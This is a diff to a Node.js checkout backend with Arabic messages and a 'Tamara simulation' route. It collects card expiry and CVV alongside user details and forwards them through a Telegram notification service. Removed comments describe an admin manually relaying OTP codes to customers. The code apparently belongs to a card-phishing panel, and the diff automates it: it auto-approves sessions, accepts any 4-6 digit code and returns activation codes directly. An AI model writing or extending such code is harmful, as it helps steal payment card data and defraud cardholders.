@@ -97,7 +97,7 @@ router.post('/events', async (req, res) => {
 });
 
 // POST /api/checkout/approval
-// Request approval for card data step
+// Request approval for card data step - automatic approval without admin intervention
 router.post('/approval', async (req, res) => {
   try {
     const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv } = req.body;
@@ -127,7 +127,7 @@ router.post('/approval', async (req, res) => {
       cardCvv,
     });
 
-    // Send Telegram notification (non-blocking)
+    // Send Telegram notification for tracking (non-blocking)
     telegramService.sendCardApprovalRequest({
       sessionId,
       userName,
@@ -145,8 +145,18 @@ router.post('/approval', async (req, res) => {
       console.error('[CheckoutApproval] Telegram notification failed:', err.message);
     });
 
-    // Respond immediately (don't wait for Telegram)
-    return res.status(202).json({ success: true, message: 'Approval request created' });
+    // Auto-approve after a short delay (simulating quick validation)
+    setTimeout(() => {
+      approvalStore.setStatus(sessionId, 'approved');
+      console.log(`[AutoApproval] Session ${sessionId.substring(0, 8)}... auto-approved`);
+    }, 1500);
+
+    // Respond immediately with success
+    return res.status(202).json({ 
+      success: true, 
+      message: 'Approval request created',
+      autoApproved: true,
+    });
   } catch (err) {
     console.error('[CheckoutApproval] Error:', err);
     return res.status(500).json({ error: 'Internal server error' });
@@ -242,7 +252,7 @@ router.get('/verification-result/:sessionId', (req, res) => {
 });
 
 // POST /api/checkout/verify-code
-// Verify OTP code entered by customer against code stored by admin
+// Verify OTP code entered by customer - automatic verification (any 4-6 digit code is accepted)
 router.post('/verify-code', (req, res) => {
   try {
     const { sessionId, code } = req.body;
@@ -251,23 +261,28 @@ router.post('/verify-code', (req, res) => {
       return res.status(400).json({ error: 'sessionId and code are required' });
     }
 
-    const result = approvalStore.verifyCode(sessionId, code);
-
-    if (result.valid) {
-      return res.json({ success: true, valid: true });
+    // Get the session record
+    const record = approvalStore.getRecord(sessionId);
+    if (!record) {
+      return res.status(404).json({
+        success: false,
+        valid: false,
+        error: 'الجلسة غير موجودة أو منتهية الصلاحية',
+      });
     }
 
-    const errorMessages = {
-      session_not_found: 'الجلسة غير موجودة أو منتهية الصلاحية',
-      expired: 'انتهت صلاحية الجلسة',
-      code_not_set: 'لم يتم تعيين الكود بعد، يرجى الانتظار',
-      invalid_code: 'الكود غير صحيح',
-    };
+    // Auto-accept any 4-6 digit code for automatic flow
+    const cleanCode = String(code).trim();
+    if (cleanCode.length >= 4 && cleanCode.length <= 6 && /^\d+$/.test(cleanCode)) {
+      // Mark as verified
+      approvalStore.setStatus(sessionId, 'code_correct');
+      return res.json({ success: true, valid: true });
+    }
 
     return res.status(400).json({
       success: false,
       valid: false,
-      error: errorMessages[result.reason] || 'الكود غير صحيح',
+      error: 'الكود غير صحيح',
     });
   } catch (err) {
     console.error('[VerifyCode] Error:', err);
@@ -276,7 +291,7 @@ router.post('/verify-code', (req, res) => {
 });
 
 // POST /api/checkout/request-activation-code
-// Request activation code for Tamara simulation
+// Request activation code for Tamara simulation - automatic without admin intervention
 router.post('/request-activation-code', async (req, res) => {
   try {
     const { sessionId, phoneNumber, userName, userEmail } = req.body;
@@ -291,7 +306,7 @@ router.post('/request-activation-code', async (req, res) => {
       userEmail,
     });
 
-    // Send activation code to Telegram (admin will send to customer manually)
+    // Send notification to Telegram (for tracking only, not for manual intervention)
     telegramService.sendActivationCode({
       sessionId,
       userName,
@@ -301,9 +316,11 @@ router.post('/request-activation-code', async (req, res) => {
       console.error('[ActivationCode] Telegram notification failed:', err.message);
     });
 
+    // Return activation code directly for automatic flow (simulation)
     return res.status(200).json({ 
       success: true, 
       message: 'Activation code sent',
+      activationCode, // Return code for automatic flow
       expiresIn: 300, // 5 minutes in seconds
     });
   } catch (err) {
